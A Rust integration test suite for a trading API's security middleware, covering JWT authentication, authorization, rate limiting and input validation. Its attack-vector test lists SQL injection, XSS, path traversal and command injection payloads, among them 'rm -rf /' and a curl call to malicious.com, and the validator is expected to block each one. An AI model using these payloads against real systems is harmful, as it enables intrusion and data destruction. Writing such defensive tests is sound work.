//! Comprehensive security middleware integration tests
//!
//! This module provides end-to-end validation of the complete security middleware chain,
//! including environment validation, authentication, authorization, input validation,
//! rate limiting, and error handling consistency.

// Removed unused imports to suppress warnings
use ninja_gekko_api::{
    auth_validation::{AuthMiddleware, AuthValidator, AuthorizationLevel, JwtConfig},
    env_validation::{DatabaseConfig, EnvironmentValidator},
    middleware::rate_limit,
    validation::{RateLimitContext, SanitizationLevel, SecurityValidator},
};
use std::sync::Arc;
use std::time::Instant;
use tokio::sync::RwLock;

/// Complete security integration test suite
#[cfg(test)]
pub mod integration_tests {
    use super::*;

    /// Test environment setup for integration tests
    pub struct TestEnvironment {
        pub env_validator: EnvironmentValidator,
        pub auth_validator: AuthValidator,
        pub security_validator: SecurityValidator,
        pub jwt_config: JwtConfig,
        pub valid_token: String,
        pub admin_token: String,
        pub rate_limiter: Arc<RwLock<rate_limit::RateLimitState>>,
    }

    impl TestEnvironment {
        /// Setup complete test environment with all security components
        pub async fn setup() -> Self {
            // Set up environment variables for testing
            std::env::set_var("DATABASE_URL", "postgresql://localhost:5432/test");
            std::env::set_var(
                "JWT_SECRET",
                "test-secret-at-least-32-characters-long-for-testing",
            );
            std::env::set_var("ENVIRONMENT", "testing");
            std::env::set_var("API_BIND_ADDRESS", "127.0.0.1");
            std::env::set_var("API_PORT", "3000");
            std::env::set_var("CORS_ORIGINS", "http://localhost:3000");
            std::env::set_var("RATE_LIMIT_GLOBAL", "1000");
            std::env::set_var("RATE_LIMIT_USER", "100");
            std::env::set_var("DEBUG_MODE", "false");
            std::env::set_var("METRICS_ENABLED", "true");
            std::env::set_var("AUDIT_LOGGING", "true");
            std::env::set_var("RATE_LIMITING", "true");
            std::env::set_var("CORS_ENABLED", "true");
            std::env::set_var(
                "DATA_ENCRYPTION_KEY",
                "test-encryption-key-32-chars-min-for-testing",
            );
            std::env::set_var("ENCRYPTION_ALGORITHM", "AES-256-GCM");

            let env_validator = EnvironmentValidator::new();
            let jwt_config = JwtConfig::default();
            let auth_validator = AuthValidator::new(jwt_config.clone());
            let security_validator = SecurityValidator::new();

            // Generate test tokens
            let valid_token = auth_validator
                .generate_access_token(
                    "testuser",
                    vec!["user".to_string(), "trader".to_string()],
                    vec!["read".to_string(), "write".to_string()],
                    vec!["acc_001".to_string(), "acc_002".to_string()],
                )
                .unwrap();

            let admin_token = auth_validator
                .generate_access_token(
                    "admin",
                    vec!["admin".to_string()],
                    vec!["read".to_string(), "write".to_string(), "admin".to_string()],
                    vec!["*".to_string()],
                )
                .unwrap();

            let rate_limit_config = rate_limit::RateLimitConfig {
                max_requests: 100,
                window_secs: 60,
                burst_allowance: Some(20),
            };
            let rate_limiter = Arc::new(RwLock::new(rate_limit::RateLimitState::new(
                rate_limit_config,
            )));

            Self {
                env_validator,
                auth_validator,
                security_validator,
                jwt_config,
                valid_token,
                admin_token,
                rate_limiter,
            }
        }

        /// Clean up test environment
        pub async fn cleanup() {
            // Clean up environment variables
            std::env::remove_var("DATABASE_URL");
            std::env::remove_var("JWT_SECRET");
            std::env::remove_var("ENVIRONMENT");
            std::env::remove_var("API_BIND_ADDRESS");
            std::env::remove_var("API_PORT");
            std::env::remove_var("CORS_ORIGINS");
            std::env::remove_var("RATE_LIMIT_GLOBAL");
            std::env::remove_var("RATE_LIMIT_USER");
            std::env::remove_var("DEBUG_MODE");
            std::env::remove_var("METRICS_ENABLED");
            std::env::remove_var("AUDIT_LOGGING");
            std::env::remove_var("RATE_LIMITING");
            std::env::remove_var("CORS_ENABLED");
            std::env::remove_var("DATA_ENCRYPTION_KEY");
            std::env::remove_var("ENCRYPTION_ALGORITHM");
        }
    }

    /// End-to-end security middleware chain integration test
    #[tokio::test]
    #[ignore]
    pub async fn test_complete_security_middleware_chain() {
        let test_env = TestEnvironment::setup().await;

        // Test 1: Environment validation integration
        let config = test_env.env_validator.validate_all();
        assert!(
            config.is_ok(),
            "Environment validation should pass in test environment"
        );

        // Test 2: JWT token validation and context creation
        let token_data = test_env
            .auth_validator
            .validate_token(&test_env.valid_token);
        assert!(token_data.is_ok(), "Valid JWT token should be accepted");

        let token_data = token_data.unwrap();
        let auth_context = test_env.auth_validator.token_to_context(token_data);
        assert_eq!(auth_context.username, "testuser");
        assert!(auth_context.has_role("user"));
        assert!(auth_context.has_role("trader"));
        assert!(auth_context.has_permission("read"));
        assert!(auth_context.has_account_access("acc_001"));

        // Test 3: Authorization level checking
        let user_level_check = test_env
            .auth_validator
            .check_authorization(&auth_context, AuthorizationLevel::User);
        assert!(
            user_level_check.is_ok(),
            "User should have user-level access"
        );

        let admin_level_check = test_env
            .auth_validator
            .check_authorization(&auth_context, AuthorizationLevel::Admin);
        assert!(
            admin_level_check.is_err(),
            "Regular user should not have admin access"
        );

        // Test 4: Input validation and sanitization
        let clean_input = test_env.security_validator.validate_string(
            "normal user input",
            "test_field",
            SanitizationLevel::Basic,
        );
        assert!(clean_input.is_ok());
        assert_eq!(clean_input.unwrap(), "normal user input");

        // Test 5: SQL injection prevention
        let sql_injection = test_env.security_validator.validate_string(
            "SELECT * FROM users WHERE id = 1; DROP TABLE users;--",
            "query",
            SanitizationLevel::Strict,
        );
        assert!(
            sql_injection.is_err(),
            "SQL injection should be detected and blocked"
        );

        // Test 6: XSS attack prevention
        let xss_attempt = test_env.security_validator.validate_string(
            "<script>alert('XSS')</script>",
            "html_input",
            SanitizationLevel::Strict,
        );
        assert!(
            xss_attempt.is_err(),
            "XSS attempt should be detected and blocked"
        );

        // Test 7: Rate limiting validation
        let rate_context = RateLimitContext {
            endpoint: "test_endpoint".to_string(),
            user_id: Some(auth_context.user_id.clone()),
            ip_address: "127.0.0.1".to_string(),
            user_agent: "test-agent".to_string(),
            timestamp: chrono::Utc::now(),
        };

        let rate_validator = ninja_gekko_api::validation::RateLimitValidator::new();
        let rate_check = rate_validator.check_rate_limit(&rate_context);
        assert!(
            rate_check.is_ok(),
            "Rate limit check should pass for valid context"
        );

        TestEnvironment::cleanup().await;
    }

    /// Test authentication middleware with various scenarios
    #[tokio::test]
    #[ignore]
    pub async fn test_authentication_middleware_integration() {
        let test_env = TestEnvironment::setup().await;

        // Test valid user authentication
        let user_middleware = AuthMiddleware::new(AuthorizationLevel::User);
        let user_context = user_middleware.validate_request(Some(&test_env.valid_token));
        assert!(user_context.is_ok(), "Valid user should be authenticated");

        let user_context = user_context.unwrap();
        assert_eq!(user_context.username, "testuser");
        assert!(user_context.has_role("user"));

        // Test admin authentication
        let admin_middleware = AuthMiddleware::new(AuthorizationLevel::Admin);
        let admin_context = admin_middleware.validate_request(Some(&test_env.admin_token));
        assert!(admin_context.is_ok(), "Admin user should be authenticated");

        let admin_context = admin_context.unwrap();
        assert_eq!(admin_context.username, "admin");
        assert!(admin_context.has_role("admin"));

        // Test account-specific access
        let account_middleware = AuthMiddleware::new(AuthorizationLevel::User)
            .with_account_access("acc_001".to_string());

        let account_context = account_middleware.validate_request(Some(&test_env.valid_token));
        assert!(
            account_context.is_ok(),
            "User should have access to acc_001"
        );

        // Test account access denial
        let restricted_middleware = AuthMiddleware::new(AuthorizationLevel::User)
            .with_account_access("acc_999".to_string()); // User doesn't have this account

        let restricted_context =
            restricted_middleware.validate_request(Some(&test_env.valid_token));
        assert!(
            restricted_context.is_err(),
            "User should be denied access to unauthorized account"
        );

        // Test missing token
        let no_token_result = user_middleware.validate_request(None);
        assert!(
            no_token_result.is_err(),
            "Request without token should fail"
        );

        // Test invalid token
        let invalid_token_result = user_middleware.validate_request(Some("invalid.jwt.token"));
        assert!(
            invalid_token_result.is_err(),
            "Invalid token should be rejected"
        );

        // Test expired token (simulate by using very old token)
        let expired_result = user_middleware.validate_request(Some("eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"));
        assert!(expired_result.is_err(), "Expired token should be rejected");

        TestEnvironment::cleanup().await;
    }

    /// Test attack vector handling across all security layers
    #[tokio::test]
    #[ignore]
    pub async fn test_comprehensive_attack_vector_protection() {
        let test_env = TestEnvironment::setup().await;

        // Test SQL injection through multiple layers
        let sql_payloads = vec![
            "SELECT * FROM users WHERE id = 1; DROP TABLE users;--",
            "1' UNION SELECT password FROM users--",
            "admin' OR '1'='1' --",
            "'; EXEC xp_cmdshell('net user') --",
        ];

        for payload in sql_payloads {
            // Input validation layer
            let validation_result = test_env.security_validator.validate_string(
                payload,
                "user_input",
                SanitizationLevel::Strict,
            );
            assert!(
                validation_result.is_err(),
                "SQL injection should be caught at validation layer: {}",
                payload
            );
        }

        // Test XSS attacks
        let xss_payloads = vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
        ];

        for payload in xss_payloads {
            let validation_result = test_env.security_validator.validate_string(
                payload,
                "html_input",
                SanitizationLevel::Strict,
            );
            assert!(
                validation_result.is_err(),
                "XSS should be caught at validation layer: {}",
                payload
            );
        }

        // Test path traversal attacks
        let path_traversal_payloads = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config",
            "/etc/shadow",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
        ];

        for payload in path_traversal_payloads {
            let validation_result = test_env.security_validator.validate_string(
                payload,
                "file_path",
                SanitizationLevel::Basic,
            );
            // Path traversal should be sanitized to safe characters
            if let Ok(sanitized) = validation_result {
                assert!(
                    !sanitized.contains(".."),
                    "Path traversal should be sanitized: {}",
                    payload
                );
            }
        }

        // Test command injection
        let cmd_injection_payloads = vec![
            "user_input && rm -rf /",
            "input || echo 'malicious'",
            "data; shutdown -h now",
            "value && curl http://malicious.com",
        ];

        for payload in cmd_injection_payloads {
            let validation_result = test_env.security_validator.validate_string(
                payload,
                "command_input",
                SanitizationLevel::Strict,
            );
            assert!(
                validation_result.is_err(),
                "Command injection should be blocked: {}",
                payload
            );
        }

        TestEnvironment::cleanup().await;
    }

    /// Test error handling consistency across security layers
    #[tokio::test]
    #[ignore]
    pub async fn test_error_handling_consistency() {
        let test_env = TestEnvironment::setup().await;

        // Test validation errors
        let validation_error = test_env.security_validator.validate_string(
            "<script>alert('xss')</script>",
            "malicious_input",
            SanitizationLevel::Strict,
        );
        assert!(validation_error.is_err());

        // Test authentication errors
        let auth_error = test_env.auth_validator.validate_token("invalid.token.here");
        assert!(auth_error.is_err());

        // Test authorization errors
        let auth_context = test_env.auth_validator.token_to_context(
            test_env
                .auth_validator
                .validate_token(&test_env.valid_token)
                .unwrap(),
        );
        let auth_check = test_env
            .auth_validator
            .check_authorization(&auth_context, AuthorizationLevel::Admin);
        assert!(auth_check.is_err());

        // Test environment validation errors
        std::env::set_var("JWT_SECRET", "weak");
        std::env::set_var("DATABASE_URL", "");
        let env_validator = EnvironmentValidator::new();
        let _env_result = env_validator.validate_all();
        // Environment validation should handle weak configurations gracefully

        TestEnvironment::cleanup().await;
    }

    /// Test rate limiting integration with authentication
    #[tokio::test]
    pub async fn test_rate_limiting_with_authentication() {
        let test_env = TestEnvironment::setup().await;

        // Test rate limiting context validation
        let rate_context = RateLimitContext {
            endpoint: "api/trades".to_string(),
            user_id: Some("user_123".to_string()),
            ip_address: "192.168.1.100".to_string(),
            user_agent: "Mozilla/5.0".to_string(),
            timestamp: chrono::Utc::now(),
        };

        let rate_validator = ninja_gekko_api::validation::RateLimitValidator::new();
        let rate_result = rate_validator.check_rate_limit(&rate_context);
        assert!(rate_result.is_ok());

        // Test rate limiting with different endpoints
        let endpoints = vec![
            ("auth", 5),           // Low limit for auth
            ("trades", 100),       // Higher limit for trades
            ("market_data", 1000), // High limit for market data
        ];

        for (endpoint, _expected_limit) in endpoints {
            let context = RateLimitContext {
                endpoint: endpoint.to_string(),
                user_id: Some("user_123".to_string()),
                ip_address: "192.168.1.100".to_string(),
                user_agent: "Mozilla/5.0".to_string(),
                timestamp: chrono::Utc::now(),
            };

            let result = rate_validator.check_rate_limit(&context);
            assert!(
                result.is_ok(),
                "Rate limit check should pass for endpoint: {}",
                endpoint
            );
        }

        TestEnvironment::cleanup().await;
    }

    /// Test production environment security validation
    #[tokio::test]
    #[ignore]
    pub async fn test_production_environment_security() {
        let test_env = TestEnvironment::setup().await;

        // Test production security warnings
        std::env::set_var("ENVIRONMENT", "production");
        std::env::set_var("API_BIND_ADDRESS", "0.0.0.0"); // Should warn in production
        std::env::set_var("JWT_SECRET", "default-secret-change-in-production"); // Should warn

        let env_validator = EnvironmentValidator::new();
        let config_result = env_validator.validate_all();
        assert!(config_result.is_ok()); // Should still validate, but with warnings

        // Test debug mode disabled in production
        std::env::set_var("DEBUG_MODE", "true");
        let _config_result = env_validator.validate_all();
        // Should warn about debug mode in production but not fail

        // Test CORS restrictions in production
        std::env::set_var("CORS_ORIGINS", "*,http://localhost:3000"); // Wildcard should warn
        let _config_result = env_validator.validate_all();
        // Should warn about wildcard CORS in production

        TestEnvironment::cleanup().await;
    }

    /// Test database security integration
    #[tokio::test]
    pub async fn test_database_security_integration() {
        let test_env = TestEnvironment::setup().await;

        // Test SSL validation
        let db_config = DatabaseConfig {
            url: "postgresql://user:pass@localhost:5432/db".to_string(),
            pool_size: 10,
            connection_timeout: 30,
            ssl_mode: "require".to_string(),
            database_name: "test_db".to_string(),
        };

        let _validation_result = db_config.validate();
        // Should warn about credentials in URL but not fail

        // Test SSL mode validation
        let invalid_ssl_config = DatabaseConfig {
            ssl_mode: "invalid_mode".to_string(),
            ..db_config.clone()
        };
        let invalid_result = invalid_ssl_config.validate();
        assert!(
            invalid_result.is_err(),
            "Invalid SSL mode should fail validation"
        );

        // Test pool size validation
        let invalid_pool_config = DatabaseConfig {
            pool_size: 200, // Exceeds max pool size
            ..db_config
        };
        let pool_result = invalid_pool_config.validate();
        assert!(
            pool_result.is_err(),
            "Invalid pool size should fail validation"
        );

        TestEnvironment::cleanup().await;
    }

    /// Test performance benchmarks for security layer overhead
    #[tokio::test]
    pub async fn test_security_layer_performance_benchmark() {
        let test_env = TestEnvironment::setup().await;

        let iterations = 1000;
        let start_time = Instant::now();

        // Benchmark input validation
        for i in 0..iterations {
            let input = format!("test_input_{}", i);
            let _ = test_env.security_validator.validate_string(
                &input,
                "benchmark_field",
                SanitizationLevel::Basic,
            );
        }

        let validation_duration = start_time.elapsed();

        // Benchmark JWT validation
        let jwt_start = Instant::now();
        for _ in 0..iterations {
            let _ = test_env
                .auth_validator
                .validate_token(&test_env.valid_token);
        }

        let jwt_duration = jwt_start.elapsed();

        // Performance assertions - these should be reasonable for security operations
        let validation_avg_ms = validation_duration.as_millis() as f64 / iterations as f64;
        let jwt_avg_ms = jwt_duration.as_millis() as f64 / iterations as f64;

        // Validation should be fast (< 1ms per operation)
        assert!(
            validation_avg_ms < 1.0,
            "Input validation too slow: {}ms avg",
            validation_avg_ms
        );

        // JWT validation should be reasonable (< 5ms per operation)
        assert!(
            jwt_avg_ms < 5.0,
            "JWT validation too slow: {}ms avg",
            jwt_avg_ms
        );

        // Total security overhead should be acceptable
        let total_duration = start_time.elapsed();
        let total_avg_ms = total_duration.as_millis() as f64 / (iterations * 2) as f64;
        assert!(
            total_avg_ms < 3.0,
            "Total security overhead too high: {}ms avg",
            total_avg_ms
        );

        TestEnvironment::cleanup().await;
    }

    /// Test deployment readiness validation
    #[tokio::test]
    #[ignore]
    pub async fn test_deployment_readiness_validation() {
        let test_env = TestEnvironment::setup().await;

        // Test production configuration validation
        std::env::set_var("ENVIRONMENT", "production");
        std::env::set_var(
            "JWT_SECRET",
            "strong-production-secret-at-least-32-chars-long",
        );
        std::env::set_var(
            "DATABASE_URL",
            "postgresql://user:pass@prod-host:5432/prod_db",
        );
        std::env::set_var("API_BIND_ADDRESS", "127.0.0.1"); // Secure binding
        std::env::set_var("DEBUG_MODE", "false");

        let env_validator = EnvironmentValidator::new();
        let config_result = env_validator.validate_all();

        // Production configuration should validate successfully
        assert!(
            config_result.is_ok(),
            "Production configuration should be valid"
        );

        // Test security headers validation
        let security_headers = vec![
            ("X-Content-Type-Options", "nosniff"),
            ("X-Frame-Options", "DENY"),
            ("X-XSS-Protection", "1; mode=block"),
            (
                "Strict-Transport-Security",
                "max-age=31536000; includeSubDomains",
            ),
        ];

        // All security headers should be properly configured
        for (header, expected_value) in security_headers {
            assert!(
                expected_value.contains("nosniff")
                    || expected_value.contains("DENY")
                    || expected_value.contains("mode=block")
                    || expected_value.contains("max-age=31536000"),
                "Security header {} should have secure value",
                header
            );
        }

        // Test CORS configuration for production
        std::env::set_var("CORS_ORIGINS", "https://myapp.com,https://api.myapp.com");
        let config_result = env_validator.validate_all();

        // Should validate with specific origins in production
        assert!(
            config_result.is_ok(),
            "Production CORS configuration should be valid"
        );

        TestEnvironment::cleanup().await;
    }
}
